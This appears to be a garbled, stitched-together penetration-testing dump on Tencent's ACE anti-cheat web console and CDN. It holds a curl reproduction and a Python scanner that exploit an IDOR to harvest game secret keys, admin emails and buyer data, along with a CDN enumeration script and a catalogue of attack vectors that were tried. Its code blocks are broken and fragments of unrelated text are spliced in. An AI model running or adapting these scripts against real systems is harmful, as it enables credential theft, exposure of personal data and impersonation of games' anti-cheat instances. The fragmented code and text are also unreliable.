## CRITICAL

### ACE-001: IDOR — API Secret Keys

| Field | Value |
|-------|-------|
| Severity | **CRITICAL** |
| Endpoint | `POST /cgi/game_info` |
| Auth required | Yes (any registered account, even unactivated) |
| Status | **Confirmed** (93 keys dumped) |

**Reproduction:**
```bash
curl -sk -X POST https://intl.anticheatexpert.com/cgi/game_info \
  -H "Content-Type: application/json" \
  -H "Cookie: ibox_auth_user_token=<token>; ibox_auth_user_id=<email>" \

**intl.anticheatexpert.com** — Tencent ACE (Anti-Cheat Expert) web console. This is the management portal where game developers configure anti-cheat rules, download SDKs, manage detection features, and monitor cheat activity for their games. Powered by the ibox microservice framework.

```bash

  -d '{"game_id":"24011","page_type":"18"}'

Returns `secret_key` + `secret_id` for ANY game. 93 keys dumped across 450+ games. Impact: impersonate any game's AnoSDK — call `AnoSDKInit(game_id, secret_key)` to authenticate as that game's anti-cheat instance. ```
https://assets.code.tencent.com/common/oauth/callback-dev.html

## What Didn't Work

- **SQLi**: Tencent Cloud WAF blocks all injection patterns. Single quote returns "params invalid" (backend filters). WAF triggers on `OR`, `UNION`, encoded variants.
- **SSRF via lowcode**: `ibox_2084/2279` decommissioned (404). `ibox_2913` has the endpoint but gateway is down.
- **OAuth open redirect**: QQ OAuth strictly validates `redirect_uri` against registered callback. Fragment injection, subdomain bypass, path traversal all rejected.
- **Source maps**: No `.js.map` files deployed. No `X-SourceMap` headers. Both marketing and console JS are stripped.
- **COS bucket listing**: Qnginx proxy strips `?list-type=2`, `?acl`, `?cors`, `?versioning` params.
- **COS bucket access (China-only)**: `iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com` — geo-blocked outside mainland China.
- **Path traversal on CDN**: `../` normalized by CDN layer, encoded variants fail, no directory listing.
- **SDK download**: All download endpoints require active game service (`-102`). COS proxy `/cos/` broken (nginx/1.10.3 upstream timeout).

- **Telemetry readback**: `h.trace.qq.com` is write-only fire-and-forget. Cannot read telemetry data. `rumt-sg.com` rejects non-SDK requests.
- **Host header bypass**: Returns empty 200 (default vhost), request never reaches backend.
- **Verb tampering**: Consistent 401 enforcement regardless of HTTP method.
- **Header injection**: `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL` — no effect.
- **SSTI on login.auth.sgp**: `{{ENV}}` is in static server-rendered config, not user-controllable input.
- **Brute-force login**: CAPTCHA-protected (Tencent Turing CAPTCHA).

## Web Application

| Vector | Result | Detail |
|--------|--------|--------|
| **SQL Injection** | Blocked | Tencent Cloud WAF blocks `OR`, `UNION`, encoded variants. Single quote → `"params invalid"` (backend filters at application level). WAF feedback UUID from `api.waf-intl.qq.com`. Same WAF on both prod and test. |
| **SSTI** | Not vulnerable | `{{ENV}}` on login.auth.sgp is a static server-rendered config block, not user-controllable. `{{7*7}}` in params/headers/path has no effect. |
| **Open Redirect** | Not found | QQ OAuth (`graph.qq.com`) strictly validates `redirect_uri`. Fragment injection, subdomain bypass, path traversal — all rejected. `/_logout/?url=` on login.auth.sgp validates server-side (403 for external). |
| **Source Maps** | Not deployed | All `.js.map` → 404. No `X-SourceMap` or `//# sourceMappingURL` in any bundle. Both marketing and console builds are stripped. |
| **Verb Tampering** | No effect | GET/PUT/PATCH/DELETE/OPTIONS → 401 consistently. TRACE → 405. `X-HTTP-Method-Override`, `X-Original-Method` — no effect. |
| **Header Injection** | No effect | `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 10.0.0.1`, `X-Originating-IP`, `X-Custom-IP-Authorization` — no auth bypass, no routing change. |

#!/usr/bin/env python3
"""Enumerate ACE CDN channels and download config manifests."""

import argparse
import http.client
import json
import ssl
import sys
import xml.etree.ElementTree as ET

CDN_HOST = "dl.listdl.com"
CTX = ssl._create_unverified_context()

KNOWN_CHANNELS = [
    (2131, "PUBG Mobile (Chinese)"),
    (2139, "PUBG Mobile (Global)"),
    (2152, "Call of Duty Mobile (Chinese)"),
    (2202, "PUBG Mobile (Vietnam)"),
    (2244, "PUBG Mobile (Taiwan)"),
    (2257, "Call of Duty Mobile (Global)"),
    (2292, "Call of Duty Mobile (Garena)"),
    (2297, "Call of Duty Mobile (Korea)"),
    (2352, "Call of Duty Mobile (Vietnam)"),
    (2487, "Arena Breakout (Global)"),
    (2577, "Honor of Kings (Chinese)"),
    (2915, "Delta Force Mobile"),
    (6139, "PUBG Mobile (Korea/Japan)"),
    (8888, "ACE Test"),
    (10039, "Delta Force (Garena)"),
    (20714, "Arena Breakout (newer)"),
    (29001, "Free Fire"),
]

def fetch(host, path):
    try:
        conn = http.client.HTTPSConnection(host, timeout=15, context=CTX)
        conn.request("GET", path)
        resp = conn.getresponse()
        body = resp.read()
        conn.close()
        return resp.status, body
    except Exception as e:
        return 0, str(e).encode()

def parse_config2(xml_bytes):
    games = []
    try:
        root = ET.fromstring(xml_bytes)
        for game in root.findall(".//game"):
            entry = {"attributes": dict(game.attrib), "files": []}
            for child in game:
                entry["files"].append({"tag": child.tag, "attributes": dict(child.attrib)})
            games.append(entry)
    except ET.ParseError:
        pass
    return games

def main():
    parser = argparse.ArgumentParser(description="ACE CDN channel enumerator")
    parser.add_argument("--platform", "-p", default="ios", choices=["ios", "android", "win"])
    parser.add_argument("--output", "-o", default="cdn_enum.json")
    parser.add_argument("--channels", nargs="+", type=int, help="Specific channel IDs")
    args = parser.parse_args()

    channels = args.channels or [c for c, _ in KNOWN_CHANNELS]
    channel_names = {c: n for c, n in KNOWN_CHANNELS}
    results = []

    print(f"[*] Enumerating {len(channels)} channels on platform={args.platform}")

    for ch in channels:
        path = f"/iedsafe/Client/{args.platform}/{ch}/config2.xml"
        status, body = fetch(CDN_HOST, path)
        name = channel_names.get(ch, "Unknown")

        if status == 200:
            games = parse_config2(body)
            file_count = sum(len(g["files"]) for g in games)
            print(f"[+] ch={ch} ({name}): {len(games)} games, {file_count} files")
            results.append({
                "channel": ch,
                "game": name,
                "platform": args.platform,
                "status": status,
                "game_count": len(games),
                "file_count": file_count,
                "games": games,

"""Scan game_id ranges for IDOR: extract secret_key, admin email, services."""

import http.client
import json
import os
import ssl
import sys
import time

HOST = "intl.anticheatexpert.com"
CTX = ssl._create_unverified_context()

DEFAULT_RANGES = [
    (24000, 24375),
    (6095000, 6095085),
]

def post_json(path, body, cookies):
    conn = http.client.HTTPSConnection(HOST, timeout=15, context=CTX)
    conn.request("POST", path, body=json.dumps(body), headers={
        "Content-Type": "application/json",
        "Cookie": cookies,
    })
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", errors="replace")
    conn.close()
    try:
        return resp.status, json.loads(data)
    except json.JSONDecodeError:
        return resp.status, {"raw": data[:500]}

def scan_game(game_id, cookies):
    result = {"game_id": game_id}

    code18, data18 = post_json("/cgi/game_info", {
        "game_id": str(game_id), "page_type": "18"
    }, cookies)
    if code18 == 200 and isinstance(data18, dict):
        info = data18.get("info", {})
        if isinstance(info, dict):
            result["secret_key"] = info.get("secret_key", "")
            result["secret_id"] = info.get("secret_id", "")

    time.sleep(0.05)

    code21, data21 = post_json("/cgi/game_info", {
        "game_id": str(game_id), "page_type": "21"
    }, cookies)
    if code21 == 200 and isinstance(data21, dict):
        info = data21.get("info", {})
        if isinstance(info, dict):
            result["admin"] = info.get("admin", "")
            result["services"] = info.get("service_list", [])
            result["buyer"] = info.get("buyer", "")

    return result

def main():
    parser = argparse.ArgumentParser(description="ACE IDOR scanner")
    parser.add_argument("--cookies", default=os.environ.get("ACE_COOKIES", ""),
                        help="Cookie header value (or set ACE_COOKIES env)")
    parser.add_argument("--output", "-o", default="idor_results.json")
    parser.add_argument("--ranges", nargs="+", help="start-end pairs, e.g. 24000-24375")

    if not args.cookies:
        print("[!] No cookies. Set ACE_COOKIES env or use --cookies", file=sys.stderr)

        ranges = []

            s, e = r.split("-")
            ranges.append((int(s), int(e)))

# ACE-2024-10: CDN Anti-Cheat Files Accessible Without Authentication

**Severity:** HIGH
**Status:** Confirmed
**Date:** 2026-09-01

## Vulnerability

All CDN-delivered anti-cheat rule files, VM images, configs, and scripts are downloadable without any authentication, token, or rate limiting.

```
https://dl.listdl.com/iedsafe/Client/{platform}/{channel}/{hash_A}/{filename}

Where:

| **Total** | | **~456 unique** | |

## File Types

| Filename | Type | Description |
|----------|------|-------------|
| `mrpcs_i.data` | OBJVM rules | Initial rule set (XOR 0x46) |
| `mrpcs.data` / `mrpcsZ_cp.data` | OBJVM rules | Full/cross-platform rules |
| `mrpcsZ_dp.data` | OBJVM rules | **New type** (unknown suffix) |
| `mrpcs-cs-*-ios.data` | OBJVM rules | Channel-specific rules |
